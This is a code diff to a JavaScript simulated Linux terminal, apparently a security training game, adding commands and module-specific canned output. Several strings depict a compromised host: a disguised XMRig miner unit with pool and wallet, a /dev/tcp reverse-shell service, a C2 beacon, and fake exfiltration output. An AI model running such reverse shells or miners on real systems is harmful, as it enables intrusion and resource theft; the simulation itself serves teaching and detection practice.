@@ -991,7 +991,13 @@ const _CLHTerminalModule = (function() {
             case 'alias': return "ll='ls -la'\nla='ls -A'\nl='ls -CF'";
 
             // History & Terminal
-            case 'history': return state.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
+            case 'history':
+                if (args.includes('-c')) {
+                    state.commandHistory = [];
+                    state.historyIndex = 0;
+                    return 'History cleared';
+                }
+                return state.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
             case 'clear': _clear(); return null;
             case 'reset': _clear(); return null;
             case 'exit':
@@ -1022,7 +1028,7 @@ const _CLHTerminalModule = (function() {
             case 'tar': return _cmd_tar(args);
             case 'nano': return _cmd_nano(args);
             case 'vim':
-            case 'vi': return '<span class="clh-dim">vim: use nano instead in this simulation</span>';
+            case 'vi': return _cmd_vim(args);
             case 'diff': return _cmd_diff(args);
             case 'systemctl': return _cmd_systemctl(args);
             case 'service': return _cmd_service(args);
@@ -1458,10 +1464,14 @@ Change: 2026-01-17 09:00:00.000000000 +0000`;
         let startPath = '.';
         let namePattern = null;
         let typeFilter = null;
+        let permFilter = null;
+        let mtimeFilter = null;
 
         for (let i = 0; i < args.length; i++) {
             if (args[i] === '-name' && args[i + 1]) { namePattern = args[i + 1].replace(/\*/g, '.*'); i++; }
             else if (args[i] === '-type' && args[i + 1]) { typeFilter = args[i + 1]; i++; }
+            else if (args[i] === '-perm' && args[i + 1]) { permFilter = args[i + 1]; i++; }
+            else if (args[i] === '-mtime' && args[i + 1]) { mtimeFilter = args[i + 1]; i++; }
             else if (!args[i].startsWith('-')) startPath = args[i];
         }
 
@@ -1477,6 +1487,20 @@ Change: 2026-01-17 09:00:00.000000000 +0000`;
             if (namePattern) {
                 const name = path.split('/').pop();
                 if (!new RegExp(`^${namePattern}$`).test(name)) continue;
+            }
+            // Handle -perm filter (supports -4000 for SUID, -2000 for SGID, -6000 for both)
+            if (permFilter) {
+                const perms = node.perms || '';
+                if (permFilter === '-4000' || permFilter === '4000') {
+                    // SUID bit - look for 's' in user execute position or perms starting with 4
+                    if (!perms.includes('s') && !perms.startsWith('-rws') && !perms.startsWith('4')) continue;
+                } else if (permFilter === '-2000' || permFilter === '2000') {
+                    // SGID bit - look for 's' in group execute position
+                    if (!/^.{5}s/.test(perms) && !perms.startsWith('2')) continue;
+                } else if (permFilter === '-6000' || permFilter === '6000') {
+                    // Both SUID and SGID
+                    if (!perms.includes('s')) continue;
+                }
             }
             results.push(path);
         }
@@ -1544,7 +1568,7 @@ Change: 2026-01-17 09:00:00.000000000 +0000`;
     }
 
     function _cmd_which(args) {
-        const cmds = { ls: '/bin/ls', cat: '/bin/cat', bash: '/bin/bash', grep: '/bin/grep', find: '/usr/bin/find', python3: '/usr/bin/python3', nano: '/usr/bin/nano', ssh: '/usr/bin/ssh', curl: '/usr/bin/curl' };
+        const cmds = { ls: '/bin/ls', cat: '/bin/cat', bash: '/bin/bash', grep: '/bin/grep', find: '/usr/bin/find', python3: '/usr/bin/python3', nano: '/usr/bin/nano', ssh: '/usr/bin/ssh', curl: '/usr/bin/curl', sudo: '/usr/bin/sudo', vim: '/usr/bin/vim', vi: '/usr/bin/vi', tar: '/bin/tar', gzip: '/bin/gzip', nc: '/usr/bin/nc', netcat: '/usr/bin/netcat', wget: '/usr/bin/wget', chmod: '/bin/chmod', chown: '/bin/chown', ping: '/bin/ping', ps: '/bin/ps', kill: '/bin/kill', top: '/usr/bin/top', whoami: '/usr/bin/whoami', id: '/usr/bin/id', uname: '/bin/uname', hostname: '/bin/hostname', date: '/bin/date', echo: '/bin/echo', mkdir: '/bin/mkdir', rm: '/bin/rm', cp: '/bin/cp', mv: '/bin/mv', touch: '/bin/touch', head: '/usr/bin/head', tail: '/usr/bin/tail', wc: '/usr/bin/wc', sort: '/usr/bin/sort', uniq: '/usr/bin/uniq', cut: '/usr/bin/cut', awk: '/usr/bin/awk', sed: '/bin/sed' };
         return args.map(c => cmds[c] || `${c} not found`).join('\n');
     }
 
@@ -2666,6 +2690,57 @@ ${remoteUser}@${host}'s password: ********</span>
         }
 
         return _err('tar: You must specify one of -c, -t, -x');
+    }
+
+    function _cmd_vim(args) {
+        const file = args.filter(a => !a.startsWith('-'))[0];
+        if (!file) {
+            // No file specified - show vim welcome
+            return `<span class="clh-highlight">VIM - Vi IMproved</span>
+
+                            version 9.0
+                       by Bram Moolenaar et al.
+
+              Vim is open source and freely distributable
+
+                      type  :q<Enter>       to exit
+                      type  :help<Enter>    for on-line help
+                      type  :help version9  for version info
+
+<span class="clh-dim">[Vim simulation - viewing mode only. Type :q to exit]</span>`;
+        }
+
+        const path = _resolvePath(file);
+        let content = '';
+        let isNew = false;
+
+        if (state.fs[path]) {
+            if (state.fs[path].type === 'dir') {
+                return _err(`vim: ${file}: Is a directory`);
+            }
+            if (!_canRead(state.fs[path])) {
+                return _err(`vim: ${file}: Permission denied`);
+            }
+            content = state.fs[path].content || '';
+        } else {
+            isNew = true;
+        }
+
+        // Display vim interface with line numbers
+        const lines = content.split('\n');
+        const displayLines = lines.slice(0, 15).map((line, i) =>
+            `<span class="clh-dim">${(i + 1).toString().padStart(3)}</span> ${line}`
+        );
+
+        const statusLine = isNew
+            ? `<span class="clh-highlight">"${file}" [New File]</span>`
+            : `<span class="clh-highlight">"${file}" ${lines.length}L, ${content.length}C</span>`;
+
+        return `${displayLines.join('\n') || '<span class="clh-dim">~</span>'}
+${lines.length > 15 ? `<span class="clh-dim">... (${lines.length - 15} more lines)</span>` : ''}
+
+${statusLine}
+<span class="clh-dim">[Vim simulation - read-only view. Press :q to exit in real vim]</span>`;
     }
 
     function _cmd_nano(args) {
@@ -4402,7 +4477,15 @@ class CLHTerminal {
             case 'pgrep': output = this._cmdPgrep(args); break;
             case 'env': output = Object.entries(this.env).map(([k,v]) => `${k}=${v}`).join('\n'); break;
             case 'export': output = this._cmdExport(args); break;
-            case 'history': output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n'); break;
+            case 'history':
+                if (args.includes('-c')) {
+                    this.commandHistory = [];
+                    this.historyIndex = 0;
+                    output = 'History cleared';
+                } else {
+                    output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
+                }
+                break;
             case 'df': output = this._cmdDf(args); break;
             case 'du': output = this._cmdDu(args); break;
             case 'ip': output = this._cmdIp(args); break;
@@ -4462,6 +4545,7 @@ class CLHTerminal {
             case 'less': case 'more': output = this._cmdCat(args); break;
             case 'man': output = this._cmdMan(args); break;
             case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
+            case 'whereis': output = args[0] ? args.map(c => `${c}: /usr/bin/${c} /usr/share/man/man1/${c}.1.gz`).join('\n') : 'whereis: missing argument'; break;
             case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
             case 'alias': output = 'alias ll=\'ls -la\''; break;
             case 'vmstat': output = this._cmdVmstat(); break;
@@ -4578,7 +4662,15 @@ class CLHTerminal {
             case 'pgrep': output = this._cmdPgrep(args); break;
             case 'env': output = Object.entries(this.env).map(([k,v]) => `${k}=${v}`).join('\n'); break;
             case 'export': output = this._cmdExport(args); break;
-            case 'history': output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n'); break;
+            case 'history':
+                if (args.includes('-c')) {
+                    this.commandHistory = [];
+                    this.historyIndex = 0;
+                    output = 'History cleared';
+                } else {
+                    output = this.commandHistory.map((c, i) => `  ${i + 1}  ${c}`).join('\n');
+                }
+                break;
             case 'df': output = this._cmdDf(args); break;
             case 'du': output = this._cmdDu(args); break;
             case 'ip': output = this._cmdIp(args); break;
@@ -4638,6 +4730,7 @@ class CLHTerminal {
             case 'less': case 'more': output = this._cmdCat(args); break;
             case 'man': output = this._cmdMan(args); break;
             case 'which': output = args[0] ? `/usr/bin/${args[0]}` : 'which: missing argument'; break;
+            case 'whereis': output = args[0] ? args.map(c => `${c}: /usr/bin/${c} /usr/share/man/man1/${c}.1.gz`).join('\n') : 'whereis: missing argument'; break;
             case 'type': output = args[0] ? `${args[0]} is /usr/bin/${args[0]}` : 'type: missing argument'; break;
             case 'alias': output = 'alias ll=\'ls -la\''; break;
             case 'vmstat': output = this._cmdVmstat(); break;
@@ -13024,7 +13117,20 @@ Actual DISK READ:       0.00 B/s | Actual DISK WRITE:      45.23 K/s
             this.systemdTimers = [];
         }
 
+        // Module-aware service list for CLH-023
         if (args[0] === 'list-units' || args.includes('--type=service')) {
+            if (this.moduleId === 'CLH-023') {
+                return `UNIT                        LOAD   ACTIVE SUB     DESCRIPTION
+sshd.service                loaded active running OpenSSH server daemon
+nginx.service               loaded active running A high performance web server
+mysql.service               loaded active running MySQL Community Server
+cron.service                loaded active running Regular background program processing
+xmrig.service               loaded active running XMRig Cryptocurrency Miner
+reverse_shell.service       loaded active running Reverse Shell Service
+beacon.timer                loaded active waiting Beacon Timer
+
+7 loaded units listed.`;
+            }
             return `UNIT                     LOAD   ACTIVE SUB     DESCRIPTION
 sshd.service             loaded active running OpenSSH server daemon
 nginx.service            loaded active running A high performance web server
@@ -13032,8 +13138,98 @@ mysql.service            loaded active running MySQL Community Server
 cron.service             loaded active running Regular background program processing`;
         }
 
+        // systemctl cat <service> - view unit file
+        if (args[0] === 'cat') {
+            const unit = args[1] || 'sshd';
+            const unitName = unit.replace('.service', '');
+
+            if (this.moduleId === 'CLH-023') {
+                if (unitName === 'xmrig') {
+                    return `# /etc/systemd/system/xmrig.service
+[Unit]
+Description=System Resource Monitor
+After=network.target
+
+[Service]
+Type=simple
+# Mining pool: stratum+tcp://darkpool.monero.net:3333
+# Wallet: 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLAEo
+ExecStart=/opt/.hidden/xmrig -o stratum+tcp://darkpool.monero.net:3333 -u 48edfHu7V9Z84YzzMa6fUueoELZ9ZRXq9VetWzYGzKt52XU5xvqgzYnDK9URnRoJMk1j8nLAEo -p x --donate-level=1
+Restart=always
+RestartSec=10
+User=nobody
+
+[Install]
+WantedBy=multi-user.target`;
+                }
+                if (unitName === 'reverse_shell') {
+                    return `# /etc/systemd/system/reverse_shell.service
+[Unit]
+Description=Reverse Shell Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.88/4444 0>&1'
+Restart=always
+RestartSec=60
+User=root
+
+[Install]
+WantedBy=multi-user.target`;
+                }
+            }
+
+            return `# /lib/systemd/system/${unitName}.service
+[Unit]
+Description=${unitName} daemon
+After=network.target
+
+[Service]
+Type=notify
+ExecStart=/usr/sbin/${unitName}
+ExecReload=/bin/kill -HUP $MAINPID
+KillMode=process
+Restart=on-failure
+
+[Install]
+WantedBy=multi-user.target`;
+        }
+
+        // systemctl list-unit-files --state=enabled
+        if (args[0] === 'list-unit-files' || args.includes('list-unit-files')) {
+            if (args.includes('--state=enabled') || args.includes('enabled')) {
+                if (this.moduleId === 'CLH-023') {
+                    return `UNIT FILE                   STATE   VENDOR PRESET
+sshd.service                enabled enabled
+nginx.service               enabled enabled
+mysql.service               enabled enabled
+cron.service                enabled enabled
+xmrig.service               enabled disabled
+reverse_shell.service       enabled disabled
+
+6 unit files listed.`;
+                }
+                return `UNIT FILE                   STATE   VENDOR PRESET
+sshd.service                enabled enabled
+nginx.service               enabled enabled
+mysql.service               enabled enabled
+cron.service                enabled enabled
+
+4 unit files listed.`;
+            }
+            return `UNIT FILE                   STATE           VENDOR PRESET
+sshd.service                enabled         enabled
+nginx.service               enabled         enabled
+mysql.service               enabled         enabled
+cron.service                enabled         enabled
+
+4 unit files listed.`;
+        }
+
         if (args[0] === 'status') {
             const unit = args[1] || 'sshd';
+            const unitName = unit.replace('.service', '');
 
             // Check if it's a timer
             if (unit.endsWith('.timer')) {
@@ -13049,21 +13245,51 @@ Triggers: ${timerName}.service`;
                 }
             }
 
-            return `● ${unit}.service - ${unit} daemon
-   Loaded: loaded (/lib/systemd/system/${unit}.service; enabled)
+            // Module-aware status for CLH-023 suspicious services
+            if (this.moduleId === 'CLH-023') {
+                if (unitName === 'xmrig') {
+                    return `● xmrig.service - XMRig Cryptocurrency Miner
+   Loaded: loaded (/etc/systemd/system/xmrig.service; enabled)
+   Active: active (running) since Mon 2026-01-10 02:30:00 UTC; 1 week ago
+ Main PID: 6666 (xmrig)
+    Tasks: 4 (limit: 4915)
+   Memory: 86.4M
+      CPU: 98.5%
+   CGroup: /system.slice/xmrig.service
+           └─6666 /opt/.hidden/xmrig --config=/opt/.hidden/config.json`;
+                }
+                if (unitName === 'reverse_shell') {
+                    return `● reverse_shell.service - Reverse Shell Service
+   Loaded: loaded (/etc/systemd/system/reverse_shell.service; enabled)
+   Active: active (running) since Mon 2026-01-10 02:31:00 UTC; 1 week ago
+ Main PID: 6667 (bash)
+    Tasks: 1 (limit: 4915)
+   Memory: 1.2M
+   CGroup: /system.slice/reverse_shell.service
+           └─6667 /bin/bash -c bash -i >& /dev/tcp/10.0.0.88/4444 0>&1`;
+                }
+            }
+
+            return `● ${unitName}.service - ${unitName} daemon
+   Loaded: loaded (/lib/systemd/system/${unitName}.service; enabled)
    Active: active (running) since Sun 2026-01-18 09:55:00 UTC; 35min ago
- Main PID: 1234 (${unit})
+ Main PID: 1234 (${unitName})
     Tasks: 1 (limit: 4915)
    Memory: 2.3M
-   CGroup: /system.slice/${unit}.service
-           └─1234 /usr/sbin/${unit}`;
+   CGroup: /system.slice/${unitName}.service
+           └─1234 /usr/sbin/${unitName}`;
         }
 
         if (args[0] === '--failed' || args.includes('--failed')) {
-            return `UNIT                    LOAD   ACTIVE SUB    DESCRIPTION
-● suspicious.service    loaded failed failed Unknown service
+            if (this.moduleId === 'CLH-023') {
+                return `  UNIT                      LOAD   ACTIVE SUB    DESCRIPTION
+● beacon.service           loaded failed failed Beacon C2 Service
 
 1 loaded units listed.`;
+            }
+            return `UNIT                    LOAD   ACTIVE SUB    DESCRIPTION
+
+0 loaded units listed.`;
         }
 
         if (args[0] === 'list-timers') {
@@ -14247,13 +14473,26 @@ SHA256:abcdefghijklmnopqrstuvwxyz123456789 ${this.user}@${this.hostname}`;
 
         // Check if source file exists
         const sourcePath = this._resolvePath(source);
+
+        // Module-aware output for CLH-030 exfiltration
+        if (this.moduleId === 'CLH-030' && (dest.includes('10.0.0.1') || dest.includes('handler'))) {
+            const size = this.fs[sourcePath]?.size || 8548352;
+            const sizeKB = Math.round(size / 1024);
+            return `Connecting to 10.0.0.1 (SPECTER-1 handler)...
+Authenticating with public key...
+${source.padEnd(40)} 100% ${sizeKB}KB   2.4MB/s   00:03
+[+] Intel package successfully transferred to handler
+[+] SPECTER-1 confirms receipt
+[+] Mission data exfiltration complete`;
+        }
+
         if (this.fs[sourcePath]) {
             const size = this.fs[sourcePath].size || 1024;
             return `${source}                                    100% ${size}     1.2MB/s   00:00\nFile transfer complete to ${dest}`;
         }
 
         // Generic response for any file
-        return `${source}                                    100% 2516KB   2.5MB/s   00:01\nUMBRA package transfer complete to ${dest}`;
+        return `${source}                                    100% 2516KB   2.5MB/s   00:01\nPackage transfer complete to ${dest}`;
     }
 
     _cmdPing(args) {
